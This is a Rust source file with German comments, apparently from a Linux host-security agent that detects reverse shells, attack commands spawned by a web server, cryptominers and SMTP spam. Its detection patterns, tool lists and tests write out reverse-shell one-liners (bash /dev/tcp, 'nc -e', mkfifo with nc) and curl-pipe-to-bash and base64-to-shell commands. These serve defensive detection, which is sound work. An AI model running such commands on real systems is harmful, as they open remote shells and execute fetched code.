//! Erkennungen im Agent (Plan Stufe C, erste Ausbaustufe):
//!
//! - **Prozessstarts** über den Proc-Connector des Kernels (netlink, braucht CAP_NET_ADMIN,
//!   kein eBPF): Webserver/PHP startet ein Netzwerkwerkzeug oder einen typischen Angriffsbefehl.
//! - **Reverse Shell**: Shell/Interpreter, dessen stdin/stdout eine TCP-Verbindung nach außen ist.
//! - **Ausgehende Verbindungen** (alle 20 s): SMTP von Nicht-Mailserver (Spam), Mining-Ports/-Programme.
//!
//! Nur lesen, nichts blockieren. Jede Erkennung trägt Prozesskette und einen Schlüssel für die
//! Entdopplung in der Zentrale.

pub mod beacon;
pub mod dns;
pub mod net;
pub mod proc;
pub mod procconn;

use std::collections::{HashMap, HashSet};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::OnceLock;
use std::time::{Duration, Instant};

use regex::Regex;
use tyrosd_proto::Detection;

/// Elternprozesse, die Web-Anfragen bearbeiten
const WEB: &[&str] = &["apache2", "httpd", "nginx", "php-fpm", "php", "php-cgi", "lsphp", "frankenphp", "uwsgi", "gunicorn", "node", "caddy", "lighttpd"];
/// Programme, deren Start aus dem Webserver fast immer ein Angriff ist
const NET_TOOLS: &[&str] = &["nc", "ncat", "netcat", "nc.traditional", "nc.openbsd", "socat", "telnet", "nmap", "masscan"];
/// Shells und Interpreter (Reverse Shell)
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "busybox", "python", "python2", "python3", "perl", "ruby", "php", "lua", "node", "nc", "ncat", "socat"];
/// Mail-Server, die SMTP nach außen sprechen dürfen
const MTA: &[&str] = &["master", "smtp", "postfix", "exim", "exim4", "sendmail", "opensmtpd", "smtpd", "msmtp", "ssmtp", "nullmailer-send", "dma", "postdrop"];
/// bekannte Miner/Malware-Programmnamen
const MALWARE: &[&str] = &["xmrig", "kinsing", "kdevtmpfsi", "minerd", "cpuminer", "xmr-stak", "t-rex", "nbminer", "lolminer", "sysupdate", "networkservice", "kthreaddi", "dbused"];
/// Paketverwaltung/Installer: geprüft über die Programmdatei (`trust::installer_ancestor`), nicht über den Namen
use tyrosd_core::trust;

/// Programmdatei liegt in einem temporären/versteckten Ordner oder wurde nach dem Start gelöscht.
/// `pid`: Prozess (für die AppImage-Prüfung: Benutzer des Prozesses muss zum FUSE-Mount passen).
pub fn odd_exe(exe: &str, pid: Option<i32>) -> Option<&'static str> {
    // eingehängte AppImages (z. B. Collabora in Nextcloud) laufen legitim aus /tmp/.mount_* – nur mit echtem FUSE-Mount,
    // der root oder dem Benutzer des Prozesses gehört
    if trust::appimage_for(exe, pid) {
        return None;
    }
    if let Some(orig) = exe.strip_suffix(" (deleted)") {
        // per Update ersetzt (Datei liegt wieder da, Dienst nur nicht neu gestartet) → kein Verdacht.
        // Nur in Systemordnern: sonst legt ein Angreifer nach dem Löschen einfach eine gleichnamige Datei hin.
        const SYS: &[&str] = &["/usr/", "/bin/", "/sbin/", "/lib/", "/lib64/", "/lib32/", "/libx32/", "/opt/"];
        if SYS.iter().any(|d| orig.starts_with(d)) && !orig.contains("/../") && std::path::Path::new(orig).exists() {
            return None;
        }
        return Some("Programmdatei wurde nach dem Start gelöscht");
    }
    if ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/"].iter().any(|d| exe.starts_with(d)) {
        return Some("Programm läuft aus einem temporären Ordner");
    }
    const DEV: &[&str] = &["/.cache/", "/.local/", "/.nvm/", "/.cargo/", "/.rustup/", "/.vscode-server/", "/.cursor-server/", "/.pyenv/", "/.rbenv/", "/.deno/", "/.bun/",
        "/.sdkman/", "/.gradle/", "/.m2/", "/.npm/", "/.yarn/", "/.dotnet/", "/.config/", "/.volta/", "/.asdf/", "/.composer/", "/.wp-cli/"];
    if exe.contains("/.") && !DEV.iter().any(|d| exe.contains(d)) {
        return Some("Programm liegt in einem versteckten Ordner");
    }
    None
}

/// typische Mining-Pool-Ports
/// (ohne 5555/6666/7777/9000 – dort laufen oft legitime Dienste wie MinIO, Portainer, php-fpm)
const MINING_PORTS: &[u16] = &[3333, 3334, 3357, 4444, 14433, 14444, 20580, 45560, 45700];

fn suspicious_cmd() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?i)/dev/(tcp|udp)/|\b(nc|ncat|netcat)\b.*\s-(e|c)\s|\b(bash|sh)\s+-i\b|python[0-9.]*\s+-c\s.*socket|perl\s+-e\s.*socket|socat\s.*exec|base64\s+(-d|--decode)|(curl|wget)\s[^|]*\|\s*(ba)?sh|chmod\s+\+x\s+/(tmp|dev/shm|var/tmp)|(^|[\s;&|('"`])mkfifo\s+\S|^\S*/mkfifo\s+\S|xmrig|stratum\+tcp|/tmp/\.[a-z0-9]"#,
        )
        .unwrap()
    })
}

/// `base64 -d` allein ist Alltag (apt-key, Cron-Skript von Google Chrome, Zertifikats-Skripte).
/// Verdächtig ist es, wenn das Ergebnis direkt ausgeführt wird: Die aufrufende Shell-Befehlszeile leitet
/// es in einen Interpreter (`… | base64 -d | sh`) oder wertet es aus (`eval`, `$(… base64 -d …)`, `<(…)`).
/// Aufrufe aus dem Webserver bleiben davon unberührt (Regel 2 oben, kritisch).
fn harmless_base64(hit: &str, pid: i32) -> bool {
    if !hit.to_ascii_lowercase().starts_with("base64") {
        return false;
    }
    let parent = tyrosd_core::procinfo::ppid(pid)
        .and_then(|pp| std::fs::read(format!("/proc/{pp}/cmdline")).ok())
        .map(|c| String::from_utf8_lossy(&c).replace('\0', " "))
        .unwrap_or_default();
    !base64_executed(&parent)
}

/// Befehlszeile führt dekodiertes base64 aus?
fn base64_executed(cmdline: &str) -> bool {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(r"(?i)base64\s+(-d|--decode)[^;&]*\|\s*(sudo\s+)?(\S*/)?(ba|da|z|k)?sh\b|base64\s+(-d|--decode)[^;&]*\|\s*(\S*/)?(python[0-9.]*|perl|php|ruby|node)\b|eval\b[^;]*base64\s+(-d|--decode)|(\$\(|`|<\()[^)`]*base64\s+(-d|--decode)")
            .unwrap()
    })
    .is_match(cmdline)
}

fn base(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

fn is_web(name: &str) -> bool {
    WEB.iter().any(|w| name == *w || name.starts_with(&format!("{w}-")) || (name.starts_with("php") && w == &"php"))
}

/// Bewertet einen neu gestarteten Prozess.
pub fn on_exec(pid: u32) -> Option<Detection> {
    let p = proc::info(pid)?;
    let exe = base(&p.exe).to_string();
    let chain = proc::chain(pid, 6);
    // Elternkette ohne den Prozess selbst
    let parents: Vec<&String> = chain.iter().skip(1).collect();
    let web_parent = parents.iter().find(|c| is_web(c)).map(|s| s.to_string());

    // 1) Reverse Shell: Ein-/Ausgabe hängt an einer TCP-Verbindung nach außen
    if SHELLS.contains(&exe.as_str()) || SHELLS.contains(&p.comm.as_str()) {
        if let Some(remote) = net::stdio_remote(pid) {
            return Some(det("reverse_shell", "critical", format!("Reverse Shell: {} mit Netzwerkverbindung zu {remote}", p.comm),
                format!("{}\nEin-/Ausgabe ist eine TCP-Verbindung zu {remote}", p.cmdline), &p, chain, format!("{}|{remote}", p.comm)));
        }
    }
    // 2) Webserver startet Netzwerkwerkzeug oder Angriffsbefehl
    if let Some(wp) = web_parent {
        let tool = NET_TOOLS.contains(&exe.as_str());
        if tool || suspicious_cmd().is_match(&p.cmdline) {
            return Some(det("web_spawned_attack", "critical", format!("{wp} startet verdächtigen Befehl: {}", p.comm),
                p.cmdline.clone(), &p, chain, format!("{wp}|{}", p.cmdline.chars().take(80).collect::<String>())));
        }
    }
    // 3) Programm aus /tmp, versteckt oder gelöscht; bekannte Miner
    if MALWARE.contains(&exe.as_str()) || MALWARE.contains(&p.comm.as_str()) {
        return Some(det("known_malware", "critical", format!("Bekannte Schadsoftware gestartet: {}", p.comm), p.cmdline.clone(), &p, chain, p.comm.clone()));
    }
    if let Some(why) = odd_exe(&p.exe, Some(pid as i32)) {
        // Paketverwaltung (geprüftes Programm, Prozess oder Vorfahre) bzw. der Agent selbst
        if !trust::installer_ancestor(pid as i32, 16) && !trust::own_descendant(pid as i32, 16) {
            let web = parents.iter().any(|c| is_web(c));
            return Some(det("odd_exe", if web { "critical" } else { "high" }, format!("{why}: {}", p.comm),
                format!("{}\nProgramm: {}", p.cmdline, p.exe), &p, chain, p.exe.trim_end_matches(" (deleted)").to_string()));
        }
    }
    // 4) Angriffsbefehl ohne Webserver (z. B. per SSH oder Cron) – mittel. Entdoppelt nach dem
    //    gefundenen Muster: „bash -c '… | base64 -d'“ startet bash *und* base64 – eine Meldung genügt.
    //    Aufgerufen von der Paketverwaltung (z. B. apt-key → base64 -d beim Update): kein Angriff.
    let cmd = trust::strip_appimages(&p.cmdline, Some(pid as i32));
    if let Some(m) = suspicious_cmd().find(&cmd).filter(|m| !harmless_base64(m.as_str(), pid as i32)) {
        // tiefer als die angezeigte Kette: dpkg → run-parts → initramfs-tools → update-initramfs → mkinitramfs → … → ln
        let by_installer = trust::installer_ancestor(pid as i32, 16);
        // Ausnahme nur für Prozesse des Agents selbst (PID-Kette), nicht für jede Befehlszeile mit „tyrosecd“
        if !trust::own_descendant(pid as i32, 16) && !by_installer {
            let hit = m.as_str().to_lowercase();
            return Some(det("suspicious_command", "medium", format!("Verdächtiger Befehl gestartet: {}", hit.trim()),
                p.cmdline.clone(), &p, chain, hit));
        }
    }
    None
}

fn det(rule: &str, sev: &str, title: String, detail: String, p: &proc::Info, chain: Vec<String>, key: String) -> Detection {
    Detection { rule: rule.into(), severity: sev.into(), title, detail: detail.chars().take(1000).collect(), pid: p.pid, exe: p.exe.clone(), proc_chain: chain, key }
}

#[cfg(test)]
mod odd_tests {
    #[test]
    fn base64_only_suspicious_when_executed() {
        // Alltag: Skript dekodiert in eine Datei bzw. Variable zum Weiterverarbeiten
        for c in ["/bin/sh /usr/bin/apt-key --quiet --readonly verify", "/bin/sh /etc/cron.daily/google-chrome", "bash -c base64 -d < key.b64 > key.gpg", ""] {
            assert!(!super::base64_executed(c), "{c}");
        }
        // ausgeführt: in eine Shell/einen Interpreter geleitet oder ausgewertet
        for c in ["bash -c echo ZWNobyBoaQ== | base64 -d | sh", "sh -c curl -s x | base64 --decode | /bin/bash", "bash -c echo x|base64 -d|python3",
            "bash -c eval \"$(echo eA== | base64 -d)\"", "sh -c $(echo eA== | base64 -d)", "bash -c bash <(echo eA== | base64 -d)"] {
            assert!(super::base64_executed(c), "{c}");
        }
    }

    #[test]
    fn mkfifo_only_as_command() {
        let r = super::suspicious_cmd();
        // als Befehl: direkt, mit Pfad, in einer Befehlskette (Reverse-Shell-Muster)
        assert!(r.is_match("mkfifo /tmp/f"));
        assert!(r.is_match("/usr/bin/mkfifo /tmp/f"));
        assert!(r.is_match("sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 1.2.3.4 4444 >/tmp/f"));
        assert!(r.is_match("bash -c 'mkfifo p && cat p'"));
        // nur als Pfad im Argument (Initramfs-Bau unter dpkg)
        assert!(!r.is_match("basename /usr/lib/klibc/bin/mkfifo"));
        assert!(!r.is_match("cp -a /usr/lib/klibc/bin/mkfifo /var/tmp/mkinitramfs_AbC123/bin"));
        assert!(!r.is_match("dpkg -L klibc-utils | grep mkfifo"));
    }

    #[test]
    fn odd_paths() {
        assert!(super::odd_exe("/tmp/.x/kworker", None).is_some());
        assert!(super::odd_exe("/usr/bin/bash (deleted)", None).is_none()); // per Update ersetzt
        assert!(super::odd_exe("/tmp/gibtsnicht-xyz (deleted)", None).is_some());
        assert!(super::odd_exe("/tmp/.mount_CollabXy/usr/bin/coolwsd", None).is_some()); // nicht eingehängt → nur ein Name
        assert!(super::odd_exe("/home/a/.cache/x", None).is_none());
        assert!(super::odd_exe("/usr/sbin/nginx", None).is_none());
        assert!(super::odd_exe("/var/www/.hidden/x", None).is_some());
        // gelöscht + gleichnamige Datei wieder hingelegt: nur in Systemordnern als „per Update ersetzt“ gewertet
        let f = std::env::temp_dir().join(format!("odd-{}", std::process::id()));
        std::fs::write(&f, "x").unwrap();
        assert!(super::odd_exe(&format!("{} (deleted)", f.display()), None).is_some());
        std::fs::remove_file(&f).ok();
        assert!(super::odd_exe("/var/www/html/../../usr/bin/bash (deleted)", None).is_some());
    }
}

/// Regelmäßige Prüfung: Reverse Shells (auch vor dem Start entstandene) und ausgehende Verbindungen.
pub fn sweep(seen: &mut HashSet<String>) -> Vec<Detection> {
    let mut out = Vec::new();
    let conns = net::established();
    if conns.is_empty() {
        return out;
    }
    let owners = net::socket_owners();
    let listening = net::listening_ports();
    let mut by_pid: HashMap<u32, Vec<&net::Conn>> = HashMap::new();
    for c in &conns {
        if let Some(pid) = owners.get(&c.inode) {
            by_pid.entry(*pid).or_default().push(c);
        }
    }
    for (pid, cs) in by_pid {
        let Some(p) = proc::info(pid) else { continue };
        let exe = base(&p.exe).to_string();
        for c in &cs {
            if c.remote_is_local() {
                continue;
            }
            let remote = c.remote();
            // SMTP nach außen von einem Programm, das kein Mailserver ist → Spam-Verdacht. Nur Port 25
            // (direkte Zustellung an fremde Mailserver, typisch für Spam-Skripte). 465/587 = Versand über ein
            // Postfach mit Anmeldung – das tun WordPress-SMTP-Plugins, Nextcloud, Laravel und Skripte alltäglich.
            if c.rport == 25 && !net::is_inbound(c, &listening) && !MTA.contains(&exe.as_str()) && !MTA.contains(&p.comm.as_str()) {
                push(&mut out, seen, det("smtp_non_mta", "high", format!("Spam-Verdacht: {} verbindet sich mit Mailserver {remote}", p.comm),
                    format!("{}\nSMTP-Verbindung (Port {}) von einem Programm, das kein Mailserver ist", p.cmdline, c.rport), &p, proc::chain(pid, 6), format!("{}|{}", p.comm, c.rport)));
            }
            // Mining: Pool-Port oder Mining-Programm. Der Pool-Port zählt nur bei ausgehenden Verbindungen –
            // bei eingehenden (z. B. SSH) ist der entfernte Port der zufällige Absender-Port des Clients.
            let miner_cmd = p.cmdline.to_lowercase();
            if (MINING_PORTS.contains(&c.rport) && !net::is_inbound(c, &listening) && trust::benign(pid as i32).is_none()) || miner_cmd.contains("xmrig") || miner_cmd.contains("stratum") {
                let sev = if miner_cmd.contains("xmrig") || miner_cmd.contains("stratum") { "critical" } else { "high" };
                push(&mut out, seen, det("crypto_mining", sev, format!("Mining-Verdacht: {} verbindet sich mit {remote}", p.comm),
                    format!("{}\nZiel-Port {} ist typisch für Mining-Pools", p.cmdline, c.rport), &p, proc::chain(pid, 6), format!("{}|{remote}", p.comm)));
            }
        }
        // Programm aus /tmp bzw. gelöscht baut Verbindungen nach außen auf (Malware, Fernsteuerung)
        if let Some(why) = odd_exe(&p.exe, Some(pid as i32)) {
            if let Some(c) = cs.iter().find(|c| !c.remote_is_local()) {
                push(&mut out, seen, det("odd_exe_network", "critical", format!("{why} und verbindet sich nach außen: {}", p.comm),
                    format!("{}\nProgramm: {}\nVerbindung zu {}", p.cmdline, p.exe, c.remote()), &p, proc::chain(pid, 6), format!("{}|{}", p.exe, c.remote())));
            }
        }
        // Reverse Shell, die vor dem Agent-Start entstanden ist
        if SHELLS.contains(&exe.as_str()) || SHELLS.contains(&p.comm.as_str()) {
            if let Some(remote) = net::stdio_remote(pid) {
                push(&mut out, seen, det("reverse_shell", "critical", format!("Reverse Shell: {} mit Netzwerkverbindung zu {remote}", p.comm),
                    format!("{}\nEin-/Ausgabe ist eine TCP-Verbindung zu {remote}", p.cmdline), &p, proc::chain(pid, 6), format!("{}|{remote}", p.comm)));
            }
        }
    }
    out
}

fn push(out: &mut Vec<Detection>, seen: &mut HashSet<String>, d: Detection) {
    // im Agent je Schlüssel nur einmal melden (Zentrale entdoppelt zusätzlich)
    if seen.insert(format!("{}|{}", d.rule, d.key)) {
        out.push(d);
    }
}

/// Erkennung starten: Prozessstarts (falls Proc-Connector verfügbar) + regelmäßige Prüfung.
pub fn run(stop: &'static AtomicBool, emit: impl Fn(Detection) + Send + Sync + 'static) {
    let emit = std::sync::Arc::new(emit);
    {
        let emit = emit.clone();
        std::thread::Builder::new()
            .name("detect-exec".into())
            .spawn(move || {
                let mut recent: HashMap<String, Instant> = HashMap::new();
                let r = procconn::listen(stop, |pid| {
                    if let Some(d) = on_exec(pid) {
                        // gleiche Erkennung höchstens alle 10 min
                        let k = format!("{}|{}", d.rule, d.key);
                        if recent.get(&k).map(|t| t.elapsed() > Duration::from_secs(600)).unwrap_or(true) {
                            recent.insert(k, Instant::now());
                            emit(d);
                        }
                    }
                });
                if let Err(e) = r {
                    eprintln!("[tyrosecd] Prozessstarts nicht verfügbar ({e}) – nur regelmäßige Prüfung");
                }
            })
            .ok();
    }
    std::thread::Builder::new()
        .name("detect-sweep".into())
        .spawn(move || {
            let mut seen = HashSet::new();
            let mut last_reset = Instant::now();
            while !stop.load(Ordering::Relaxed) {
                for d in sweep(&mut seen) {
                    emit(d);
                }
                if last_reset.elapsed() > Duration::from_secs(6 * 3600) {
                    seen.clear(); // fortbestehende Funde alle 6 h erneut melden
                    last_reset = Instant::now();
                }
                for _ in 0..5 {
                    // alle 5 s (Plan „Sicherheit“: ausgehende Verbindungen nahezu in Echtzeit)
                    if stop.load(Ordering::Relaxed) {
                        return;
                    }
                    std::thread::sleep(Duration::from_secs(1));
                }
            }
        })
        .ok();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn suspicious_patterns() {
        for c in ["bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc -e /bin/sh 1.2.3.4 4444", "curl http://x/y.sh | bash", "python3 -c import socket,os;s=socket.socket()", "chmod +x /tmp/.x", "./xmrig -o stratum+tcp://pool"] {
            assert!(suspicious_cmd().is_match(c), "{c}");
        }
        for c in ["sh -c /usr/sbin/sendmail -t -i", "convert in.jpg out.png", "git pull", "bash /usr/local/bin/backup.sh"] {
            assert!(!suspicious_cmd().is_match(c), "{c}");
        }
    }

    #[test]
    fn web_parents() {
        assert!(is_web("php-fpm8.3"));
        assert!(is_web("php8.2"));
        assert!(is_web("apache2"));
        assert!(!is_web("sshd"));
    }
}
